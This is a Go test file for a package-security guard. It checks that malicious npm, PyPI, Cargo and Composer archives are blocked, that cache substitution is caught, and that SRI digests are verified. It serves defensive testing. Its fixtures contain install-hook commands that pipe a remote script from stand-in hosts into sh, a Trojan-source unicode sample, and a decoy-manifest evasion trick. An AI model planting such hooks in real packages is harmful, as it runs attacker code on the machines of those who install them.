package cli

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/intelligence/artifactmap"
)

// makeTGZ builds an in-memory gzip+tar archive from path->contents, mimicking
// the npm/pypi convention of nesting everything under a top-level dir.
func makeTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{
			Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatalf("tar header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("tar write %s: %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar close: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gzip close: %v", err)
	}
	return buf.Bytes()
}

// makeZip builds an in-memory zip archive from path->contents, mimicking a
// Python wheel (.whl is a zip).
func makeZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip create %s: %v", name, err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatalf("zip write %s: %v", name, err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip close: %v", err)
	}
	return buf.Bytes()
}

func TestAnalyzeArtifact_NPMRemoteFetchInstallScript(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x.sh | sh"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for remote-fetch postinstall, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
}

// TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious pins the G4
// fix: manifests resolve relative to the archive's single top-level directory —
// the path the package manager actually extracts — not by path depth.
//
// The attack it blocks: an attacker publishes a tarball whose real, malicious
// manifest sits where the package manager reads it (package/package.json) and
// ALSO drops a benign copy at depth 0. npm's `strip:1` extract DISCARDS the
// root-level entry, so it is invisible to npm — but the old shallowest-wins
// resolution made it authoritative for the guard, blinding the entire
// behavioral scan. Verified reproducible: the same malicious manifest blocks
// without the decoy and passed with it.
func TestAnalyzeArtifact_RootDecoyManifestDoesNotMaskNestedMalicious(t *testing.T) {
	const (
		evilPostinstall = `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl -s http://evil.example/x.sh | sh"}}`
		benignPkgJSON   = `{"name":"evil","version":"1.0.0","scripts":{"test":"jest"}}`
		evilSetupPy     = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"
		benignSetupPy   = "from setuptools import setup\nsetup(name='evil', version='1.0.0')\n"
		evilBuildRs     = "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.example/x.sh | sh\").status().unwrap(); }\n"
		benignBuildRs   = "fn main() { println!(\"cargo:rerun-if-changed=src/lib.rs\"); }\n"
		evilComposer    = `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`
		benignComposer  = `{"name":"evil/pkg","scripts":{"post-install-cmd":["phpunit"]}}`
		cargoToml       = "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n"
	)

	cases := []struct {
		name      string
		ecosystem string
		// nested is the archive as the package manager sees it; decoy adds the
		// depth-0 benign copy on top.
		nested map[string]string
		decoy  map[string]string
		root   string // expected packageRoot of the decoy archive
	}{
		{
			name:      "npm_package_json",
			ecosystem: "npm",
			nested:    map[string]string{"package/package.json": evilPostinstall},
			decoy:     map[string]string{"package.json": benignPkgJSON},
			root:      "package",
		},
		{
			name:      "pypi_setup_py",
			ecosystem: "pip",
			nested:    map[string]string{"evil-1.0.0/setup.py": evilSetupPy},
			decoy:     map[string]string{"setup.py": benignSetupPy},
			root:      "evil-1.0.0",
		},
		{
			name:      "cargo_build_rs",
			ecosystem: "cargo",
			nested: map[string]string{
				"evil-1.0.0/Cargo.toml": cargoToml,
				"evil-1.0.0/build.rs":   evilBuildRs,
			},
			decoy: map[string]string{"Cargo.toml": cargoToml, "build.rs": benignBuildRs},
			root:  "evil-1.0.0",
		},
		{
			name:      "composer_json",
			ecosystem: "composer",
			nested:    map[string]string{"evil-pkg-abc1234/composer.json": evilComposer},
			decoy:     map[string]string{"composer.json": benignComposer},
			root:      "evil-pkg-abc1234",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Control: the malicious archive alone blocks.
			if v := analyzeArtifact(tc.ecosystem, makeTGZ(t, tc.nested)); !v.Block {
				t.Fatalf("control: malicious archive must block, got %+v", v)
			}
			// The decoy must not change that verdict.
			withDecoy := map[string]string{}
			for k, v := range tc.nested {
				withDecoy[k] = v
			}
			for k, v := range tc.decoy {
				withDecoy[k] = v
			}
			tgz := makeTGZ(t, withDecoy)
			if v := analyzeArtifact(tc.ecosystem, tgz); !v.Block {
				t.Fatalf("root-level decoy manifest masked the nested malicious one — got %+v", v)
			}
			// And the mechanism: the archive is single-rooted, so a depth-0
			// entry is never eligible.
			files := artifactmap.Build(tgz, artifactmap.Options{}).Files
			if got := packageRoot(files); got != tc.root {
				t.Fatalf("packageRoot = %q, want %q", got, tc.root)
			}
		})
	}
}

// TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest is the twin of the
// decoy test: archives with NO single top-level directory — a wheel (pkg/ plus
// pkg-1.0.dist-info/) or a flat .gem-shaped tar — must keep resolving their
// manifest via the shallowest-wins fallback. Anchoring to a package root is
// only correct where a package root exists; over-tightening here would silently
// drop behavioral coverage for every wheel.
func TestAnalyzeArtifact_MultiRootArchiveStillResolvesManifest(t *testing.T) {
	const evilSetupPy = "from setuptools import setup\nimport os\ncmdclass = {}\nos.system('curl -s http://evil.example/x.sh | sh')\nsetup(name='evil')\n"

	t.Run("wheel_two_top_level_dirs", func(t *testing.T) {
		// A .whl is a zip with the package dir AND a sibling .dist-info dir.
		whl := makeZip(t, map[string]string{
			"evilwheel/setup.py":                 evilSetupPy,
			"evilwheel/__init__.py":              "x = 1\n",
			"evilwheel-1.0.0.dist-info/METADATA": "Name: evilwheel\nVersion: 1.0.0\n",
			"evilwheel-1.0.0.dist-info/RECORD":   "evilwheel/__init__.py,,\n",
		})
		files := artifactmap.Build(whl, artifactmap.Options{}).Files
		if got := packageRoot(files); got != "" {
			t.Fatalf("packageRoot on a two-root wheel = %q, want \"\" (no single extract root)", got)
		}
		if rootFileBytes(files, "setup.py") == nil {
			t.Fatal("fallback failed to resolve setup.py in a multi-root archive")
		}
		if v := analyzeArtifact("pip", whl); !v.Block {
			t.Fatalf("multi-root wheel with a malicious setup.py must still block, got %+v", v)
		}
	})

	t.Run("flat_archive_depth_zero_manifest", func(t *testing.T) {
		// A .gem-shaped archive keeps everything at depth 0 — there is no root
		// to anchor to and the depth-0 manifest is the real one.
		tgz := makeTGZ(t, map[string]string{"setup.py": evilSetupPy})
		files := artifactmap.Build(tgz, artifactmap.Options{}).Files
		if got := packageRoot(files); got != "" {
			t.Fatalf("packageRoot on a flat archive = %q, want \"\"", got)
		}
		if v := analyzeArtifact("pip", tgz); !v.Block {
			t.Fatalf("flat archive with a malicious depth-0 setup.py must block, got %+v", v)
		}
	})

	t.Run("flat_archive_with_one_incidental_dir", func(t *testing.T) {
		// The shape that makes "exclude every depth-0 entry" wrong: a flat
		// composer package whose only directory is src/. The manifest lives at
		// depth 0 and must still resolve.
		tgz := makeTGZ(t, map[string]string{
			"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.example/x.sh | sh"]}}`,
			"src/Foo.php":   "<?php class Foo {}\n",
		})
		if v := analyzeArtifact("composer", tgz); !v.Block {
			t.Fatalf("flat composer package with a src/ dir must still block, got %+v", v)
		}
	})
}

func TestAnalyzeArtifact_NPMClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"fine","version":"1.0.0","scripts":{"test":"jest"}}`,
		"package/index.js":     "module.exports = 1;\n",
	})
	if v := analyzeArtifact("npm", tgz); v.Block {
		t.Fatalf("clean package must not block, got %+v", v)
	}
}

func TestAnalyzeArtifact_NPMReferencedDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"html-to-gutenberg","version":"4.2.10","scripts":{"postinstall":"node ./scripts/patch-fetch-page-assets.mjs"}}`,
		"package/scripts/patch-fetch-page-assets.mjs": `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");
fs.copyFileSync(sourcePath, targetPath);
`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
	if !strings.Contains(v.Reason, "node_modules") {
		t.Fatalf("reason = %q, want node_modules context", v.Reason)
	}
}

func TestAnalyzeArtifact_NPMInlineDependencyMutationWarns(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"patchy","version":"1.0.0","scripts":{"postinstall":"mv ./node_modules/fetch-page-assets/index.ts ./node_modules/fetch-page-assets/index.ts.bak || true"}}`,
	})
	v := analyzeArtifact("npm", tgz)
	if v.Block {
		t.Fatalf("inline dependency mutation should warn, not block: %+v", v)
	}
	if v.Severity != "behavioral-medium" {
		t.Fatalf("severity = %q, want behavioral-medium (verdict=%+v)", v.Severity, v)
	}
}

func TestAnalyzeArtifact_HiddenUnicode(t *testing.T) {
	// U+202E RIGHT-TO-LEFT OVERRIDE embedded in JS source — a Trojan-source style payload.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"sneaky","version":"1.0.0"}`,
		"package/index.js":     "const ok = true;‮ // flip\n",
	})
	v := analyzeArtifact("npm", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for hidden-unicode payload, got %+v", v)
	}
	if !strings.Contains(v.Reason, "hidden-unicode") {
		t.Errorf("reason = %q, want it to mention hidden-unicode", v.Reason)
	}
}

func TestAnalyzeArtifact_GarbageFailsOpen(t *testing.T) {
	for _, in := range [][]byte{nil, {}, []byte("not an archive at all"), {0x1f, 0x8b, 0x00}} {
		if v := analyzeArtifact("npm", in); v.Block {
			t.Fatalf("garbage input must not block (got %+v) — fail-open invariant", v)
		}
	}
}

func TestLocalArtifactBytes(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	want := []byte("tarball-bytes")
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-1.0.0.tgz"), want, 0o644); err != nil {
		t.Fatal(err)
	}

	// Unset env -> nil (fail-open, behavioral analysis off).
	t.Setenv(guardArtifactDirEnv, "")
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); b != nil {
		t.Fatalf("unset dir must return nil, got %d bytes", len(b))
	}

	t.Setenv(guardArtifactDirEnv, dir)
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
		t.Fatalf("pinned lookup = %q, want %q", b, want)
	}
	// Missing package -> nil.
	if b, _ := localArtifactBytes(packageSpec{Ecosystem: "npm", Name: "absent", Version: "9.9.9"}); b != nil {
		t.Fatalf("missing artifact must return nil, got %d bytes", len(b))
	}
}

// TestLocalArtifactBytes_EcosystemAliases pins that a staged artifact resolves
// even when the operator uses the registry directory name (pypi, gem, crates)
// instead of the guard's ecosystem verb (pip, rubygems, cargo). Without the
// alias the byte scan silently no-ops — the footgun this guards against.
func TestLocalArtifactBytes_EcosystemAliases(t *testing.T) {
	want := []byte("staged")
	cases := []struct {
		eco, dirName string // spec ecosystem (guard verb) vs the subdir the operator used
	}{
		{"pip", "pypi"},
		{"rubygems", "gem"},
		{"cargo", "crates"},
		{"go", "gomod"},
	}
	for _, tc := range cases {
		t.Run(tc.eco+"_staged_as_"+tc.dirName, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.MkdirAll(filepath.Join(dir, tc.dirName), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(dir, tc.dirName, "evil-1.0.0.tgz"), want, 0o644); err != nil {
				t.Fatal(err)
			}
			t.Setenv(guardArtifactDirEnv, dir)
			if b, _ := localArtifactBytes(packageSpec{Ecosystem: tc.eco, Name: "evil", Version: "1.0.0"}); !bytes.Equal(b, want) {
				t.Fatalf("eco %q staged under %q/ = %q, want %q (alias lookup failed)", tc.eco, tc.dirName, b, want)
			}
		})
	}
}

func TestAnalyzeArtifact_CargoBuildRsRemoteFetch(t *testing.T) {
	// A .crate nests files under <name>-<version>/. A build.rs that shells out
	// to curl is the rustdecimal-class attack — Aikido's feed is near-empty here.
	crate := makeTGZ(t, map[string]string{
		"evil-1.0.0/Cargo.toml": "[package]\nname = \"evil\"\nversion = \"1.0.0\"\nbuild = \"build.rs\"\n",
		"evil-1.0.0/build.rs":   "fn main() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"curl https://evil.test/x.sh | sh\").status().unwrap(); }\n",
	})
	v := analyzeArtifact("cargo", crate)
	if !v.Block {
		t.Fatalf("expected BLOCK for build.rs that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestAnalyzeArtifact_ComposerRemoteFetchInstallScript(t *testing.T) {
	// A composer.json whose post-install-cmd shells out to curl is the
	// PHP/Composer flavour of the remote-fetch install-script attack.
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"evil/pkg","scripts":{"post-install-cmd":["curl https://evil.test/x.sh | sh"]}}`,
	})
	v := analyzeArtifact("composer", tgz)
	if !v.Block {
		t.Fatalf("expected BLOCK for composer post-install-cmd that fetches remote code, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
	if !strings.Contains(v.Reason, "remote") {
		t.Errorf("reason = %q, want it to mention remote", v.Reason)
	}
	// The "php" alias resolves to the same detector.
	if v := analyzeArtifact("php", tgz); !v.Block {
		t.Errorf("php alias must block the same composer payload, got %+v", v)
	}
}

func TestAnalyzeArtifact_ComposerClean(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"composer.json": `{"name":"fine/pkg","scripts":{"post-install-cmd":["phpunit"]}}`,
	})
	if v := analyzeArtifact("composer", tgz); v.Block {
		t.Fatalf("clean composer package must not block, got %+v", v)
	}
}

func TestFetchArtifactBytes_FailsOpenOnServerError(t *testing.T) {
	// Deep mode on, but the registry returns 500: fetchArtifactBytes must yield
	// nil so the install proceeds (fail-open) — a guard that breaks installs on a
	// flaky registry gets uninstalled.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}
	if b, _ := fetchArtifactBytes(spec); b != nil {
		srv.Close()
		t.Fatalf("a 500 from the registry must fail open (nil), got %d bytes", len(b))
	}

	// And a dead server (connection refused) must also fail open, not error out.
	srv.Close()
	if b, _ := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("a closed/unreachable server must fail open (nil), got %d bytes", len(b))
	}
}

func TestAnalyzeArtifact_CargoClean(t *testing.T) {
	crate := makeTGZ(t, map[string]string{
		"fine-1.0.0/Cargo.toml": "[package]\nname = \"fine\"\nversion = \"1.0.0\"\n",
		"fine-1.0.0/src/lib.rs": "pub fn ok() -> bool { true }\n",
	})
	if v := analyzeArtifact("cargo", crate); v.Block {
		t.Fatalf("clean crate must not block, got %+v", v)
	}
}

// npmCacheFixture describes a synthetic npm cacache entry precisely enough to
// stage BOTH the honest shape and the cache-substitution attack.
type npmCacheFixture struct {
	Name, Version string

	// Address are the bytes whose sha512 both addresses the content file and
	// is recorded as the index entry's integrity — i.e. the tarball npm
	// believes it cached.
	Address []byte
	// Stored are the bytes actually written at that address. Equal to Address
	// in the honest case. DIFFERENT is the attack: npm's own ssri.checkData
	// would reject these on read, pacote would call cleanupCached() and
	// refetch the real tarball from the registry — so a guard that analyzed
	// them analyzed an artifact that never runs.
	Stored []byte

	// Misplace writes the index entry at index-v5/aa/bb instead of the shard
	// sha256(KEY) actually computes to, so only the bounded fallback walk can
	// find it. This is what EVERY npm-cache fixture used to do by accident,
	// which left the O(1) fast path (cacacheIntegrityForKey) with zero
	// coverage — see TestNpmCacheIndexShardIsRealNotHardcoded.
	Misplace bool
}

// writeNpmCacheFixture stages f into a fake npm cacache, returning the cache
// root to point npm_config_cache at.
func writeNpmCacheFixture(t *testing.T, f npmCacheFixture) string {
	t.Helper()
	root := t.TempDir()
	cacache := filepath.Join(root, "_cacache")
	// Content-addressed store: content-v2/sha512/<2>/<2>/<rest>, addressed by
	// the digest of Address (not necessarily of what we write there).
	sum := sha512.Sum512(f.Address)
	h := hex.EncodeToString(sum[:])
	contentDir := filepath.Join(cacache, "content-v2", "sha512", h[0:2], h[2:4])
	if err := os.MkdirAll(contentDir, 0o755); err != nil {
		t.Fatal(err)
	}
	stored := f.Stored
	if stored == nil {
		stored = f.Address
	}
	if err := os.WriteFile(filepath.Join(contentDir, h[4:]), stored, 0o644); err != nil {
		t.Fatal(err)
	}
	// Index entry: "<digest>\t<json>" with the tarball-URL key + integrity.
	integrity := "sha512-" + base64.StdEncoding.EncodeToString(sum[:])
	key := fmt.Sprintf("make-fetch-happen:request-cache:https://registry.npmjs.org/%s/-/%s-%s.tgz", f.Name, f.Name, f.Version)
	idxDir := filepath.Join(cacache, "index-v5", "aa", "bb")
	entryName := "entry"
	if !f.Misplace {
		// The real thing: cacache shards on hex(sha256(KEY)).
		kh := sha256.Sum256([]byte(key))
		khex := hex.EncodeToString(kh[:])
		idxDir = filepath.Join(cacache, "index-v5", khex[0:2], khex[2:4])
		entryName = khex[4:]
	}
	if err := os.MkdirAll(idxDir, 0o755); err != nil {
		t.Fatal(err)
	}
	line := fmt.Sprintf("deadbeef\t{\"key\":%q,\"integrity\":%q}\n", key, integrity)
	if err := os.WriteFile(filepath.Join(idxDir, entryName), []byte(line), 0o644); err != nil {
		t.Fatal(err)
	}
	return root
}

// writeNpmCache stages an honest tarball into a fake npm cacache the way npm
// would — real shard, index integrity and content agreeing — returning the
// cache root to point npm_config_cache at.
func writeNpmCache(t *testing.T, name, version string, tarball []byte) string {
	t.Helper()
	return writeNpmCacheFixture(t, npmCacheFixture{Name: name, Version: version, Address: tarball})
}

// TestNpmCacheIndexShardIsRealNotHardcoded pins the fixture bug that hid the
// O(1) lookup from the whole suite: writeNpmCache used to hardcode the index
// entry at index-v5/aa/bb, which is not the shard hex(sha256(KEY)) computes to,
// so EVERY npm-cache test resolved through the bounded fallback walk and
// cacacheIntegrityForKey was never exercised. The fast path could have broken
// silently while the suite stayed green — and every lookup would then have
// quietly depended on the budget-limited walk that goes dark on large installs.
func TestNpmCacheIndexShardIsRealNotHardcoded(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{"package/package.json": `{"name":"shardy","version":"1.0.0"}`})
	key := "make-fetch-happen:request-cache:https://registry.npmjs.org/shardy/-/shardy-1.0.0.tgz"

	// Real shard: the O(1) lookup resolves it with no walk at all.
	root := writeNpmCache(t, "shardy", "1.0.0", tgz)
	indexDir := filepath.Join(root, "_cacache", "index-v5")
	if got := cacacheIntegrityForKey(indexDir, key); got == "" {
		t.Fatal("cacacheIntegrityForKey found nothing — the fixture is not written at sha256(KEY)'s shard, so the O(1) fast path is untested")
	}

	// Misplaced shard: the fast path CANNOT see it (that is what "O(1) direct
	// shard lookup" means), and only the bounded fallback walk finds it. This
	// half is what proves the assertion above is about the shard and not just
	// about the entry existing.
	mis := writeNpmCacheFixture(t, npmCacheFixture{Name: "shardy", Version: "1.0.0", Address: tgz, Misplace: true})
	misIndex := filepath.Join(mis, "_cacache", "index-v5")
	if got := cacacheIntegrityForKey(misIndex, key); got != "" {
		t.Fatalf("a misplaced index entry must be invisible to the O(1) lookup, got %q", got)
	}
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)
	if got, res := findNpmCacheIntegrity(misIndex, "shardy", "shardy-1.0.0.tgz"); got == "" || res != acquireOK {
		t.Fatalf("the fallback walk must still find a misplaced entry, got (%q, %v)", got, res)
	}
}

// TestNpmCacheContentSubstitutionIsDigestMismatch is the consultant's test,
// expressible for the first time: the cache returns different bytes than the
// digest it is addressed by, and the guard must report that rather than
// analyzing the substitute.
//
// This is the no-lockfile arm — the anchor is npm's OWN index integrity, which
// covers the plain content-file overwrite. See the sibling test for the
// lockfile arm, which covers the attacker who rewrites the index too.
func TestNpmCacheContentSubstitutionIsDigestMismatch(t *testing.T) {
	evil := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"swapped","version":"1.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	benign := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"swapped","version":"1.0.0"}`,
	})
	// Addressed by (and indexed as) the REAL tarball's digest; the benign
	// substitute sits at that address.
	root := writeNpmCacheFixture(t, npmCacheFixture{
		Name: "swapped", Version: "1.0.0", Address: evil, Stored: benign,
	})
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	b, res := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "swapped", Version: "1.0.0"})
	if len(b) != 0 {
		t.Fatalf("substituted cache content must not be handed to the analyzer, got %d bytes", len(b))
	}
	if res != acquireDigestMismatch {
		t.Fatalf("content that does not hash to its own index integrity must report acquireDigestMismatch, got %v", res)
	}
	if !res.degraded() {
		t.Fatal("acquireDigestMismatch must count as degraded, or policy never sees it")
	}
}

// TestNpmCacheLockfileIntegrityMismatch is the same test one layer up: the
// cache is INTERNALLY consistent (index integrity and content agree, so the
// re-hash in the sibling test passes) and the project's lockfile pins a
// different digest. Only an anchor from outside the cache can catch this, which
// is why packageSpec.Integrity exists.
func TestNpmCacheLockfileIntegrityMismatch(t *testing.T) {
	planted := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"anchored","version":"2.0.0"}`,
	})
	real := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"anchored","version":"2.0.0","description":"the one the lockfile pins"}`,
	})
	root := writeNpmCacheFixture(t, npmCacheFixture{Name: "anchored", Version: "2.0.0", Address: planted})
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	realSum := sha512.Sum512(real)
	lockSRI := "sha512-" + base64.StdEncoding.EncodeToString(realSum[:])

	b, res := npmCacheArtifactBytes(packageSpec{
		Ecosystem: "npm", Name: "anchored", Version: "2.0.0", Integrity: lockSRI,
	})
	if len(b) != 0 || res != acquireDigestMismatch {
		t.Fatalf("cache bytes that disagree with the lockfile anchor: want (nil, acquireDigestMismatch), got (%d bytes, %v)", len(b), res)
	}

	// The control: the SAME cache with the lockfile anchor that matches it
	// resolves normally. Without this half the test above would pass on a
	// readCacacheContent that simply always returned acquireDigestMismatch.
	plantedSum := sha512.Sum512(planted)
	okSRI := "sha512-" + base64.StdEncoding.EncodeToString(plantedSum[:])
	b, res = npmCacheArtifactBytes(packageSpec{
		Ecosystem: "npm", Name: "anchored", Version: "2.0.0", Integrity: okSRI,
	})
	if !bytes.Equal(b, planted) || res != acquireOK {
		t.Fatalf("a matching lockfile anchor must resolve normally, got (%d bytes, %v)", len(b), res)
	}

	// And no anchor at all still resolves — the guard degrades to the
	// index-integrity check rather than refusing to analyze anything on a
	// non-lockfile install. See packageSpec.Integrity's coverage limit.
	b, res = npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "anchored", Version: "2.0.0"})
	if !bytes.Equal(b, planted) || res != acquireOK {
		t.Fatalf("an absent lockfile anchor must not degrade acquisition, got (%d bytes, %v)", len(b), res)
	}
}

// TestFetchArtifactBytesVerifiesLockfileIntegrity covers the opt-in deep-fetch
// lane, which until now performed a plain GET with no integrity check of any
// kind.
func TestFetchArtifactBytesVerifiesLockfileIntegrity(t *testing.T) {
	served := makeTGZ(t, map[string]string{"package/package.json": `{"name":"fetched","version":"1.0.0"}`})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(served)
	}))
	t.Cleanup(srv.Close)
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv("CHAINSAW_OFFLINE", "")
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)

	other := makeTGZ(t, map[string]string{"package/package.json": `{"name":"fetched","version":"1.0.0","description":"not what was served"}`})
	otherSum := sha512.Sum512(other)
	wrongSRI := "sha512-" + base64.StdEncoding.EncodeToString(otherSum[:])

	b, res := fetchArtifactBytes(packageSpec{
		Ecosystem: "npm", Name: "fetched", Version: "1.0.0", Integrity: wrongSRI,
	})
	if len(b) != 0 || res != acquireDigestMismatch {
		t.Fatalf("a registry serving bytes the lockfile does not pin: want (nil, acquireDigestMismatch), got (%d bytes, %v)", len(b), res)
	}

	servedSum := sha512.Sum512(served)
	rightSRI := "sha512-" + base64.StdEncoding.EncodeToString(servedSum[:])
	b, res = fetchArtifactBytes(packageSpec{
		Ecosystem: "npm", Name: "fetched", Version: "1.0.0", Integrity: rightSRI,
	})
	if !bytes.Equal(b, served) || res != acquireOK {
		t.Fatalf("a matching lockfile anchor must pass the fetch through, got (%d bytes, %v)", len(b), res)
	}

	// No anchor: unverified, and it still fetches. Stating the limit as a
	// test so nobody later reads the code as "deep fetch is verified".
	b, res = fetchArtifactBytes(packageSpec{Ecosystem: "npm", Name: "fetched", Version: "1.0.0"})
	if !bytes.Equal(b, served) || res != acquireOK {
		t.Fatalf("an anchorless deep fetch must still return bytes, got (%d bytes, %v)", len(b), res)
	}
}

// TestVerifySRI covers the primitive both lanes depend on, including the two
// cases that decide whether it is a real check or a decorative one: an
// unsupported algorithm must report "not checked" rather than "matched", and a
// weak entry appended alongside a strong one must not be able to decide.
func TestVerifySRI(t *testing.T) {
	data := []byte("the bytes that will run")
	s512 := sha512.Sum512(data)
	sri512 := "sha512-" + base64.StdEncoding.EncodeToString(s512[:])
	s256 := sha256.Sum256(data)
	sri256 := "sha256-" + base64.StdEncoding.EncodeToString(s256[:])
	otherSum := sha512.Sum512([]byte("different bytes"))
	bad512 := "sha512-" + base64.StdEncoding.EncodeToString(otherSum[:])

	cases := []struct {
		name          string
		sri           string
		checked, want bool
	}{
		{"empty is unchecked", "", false, false},
		{"matching sha512", sri512, true, true},
		{"mismatching sha512", bad512, true, false},
		{"matching sha256", sri256, true, true},
		{"sri option suffix tolerated", sri512 + "?foo=bar", true, true},
		{"unsupported algo is unchecked, not matched", "md5-YWJjZA==", false, false},
		{"multiple entries, strongest decides (pass)", sri256 + " " + sri512, true, true},
		{"a weak match cannot rescue a strong mismatch", sri256 + " " + bad512, true, false},
		{"a weak match cannot rescue a strong mismatch (reordered)", bad512 + " " + sri256, true, false},
		{"garbage entry is unchecked", "not-an-sri-string", false, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			checked, ok := verifySRI(data, c.sri)
			if checked != c.checked || ok != c.want {
				t.Fatalf("verifySRI(%q) = (checked=%v, ok=%v), want (checked=%v, ok=%v)", c.sri, checked, ok, c.checked, c.want)
			}
		})
	}
}

func TestNpmCacheArtifactBytes(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"cached-evil","version":"3.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	root := writeNpmCache(t, "cached-evil", "3.0.0", tgz)
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "") // force the cache path, not the staged dir

	got, _ := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil", Version: "3.0.0"})
	if !bytes.Equal(got, tgz) {
		t.Fatalf("npm cache read returned %d bytes, want the staged %d", len(got), len(tgz))
	}
	// Unpinned or missing -> nil (fail-open).
	if b, _ := npmCacheArtifactBytes(packageSpec{Ecosystem: "npm", Name: "cached-evil"}); b != nil {
		t.Errorf("unpinned spec must not resolve from cache, got %d bytes", len(b))
	}
	// And the guard blocks it end-to-end via the cache, no staging dir.
	g := newLocalGuard()
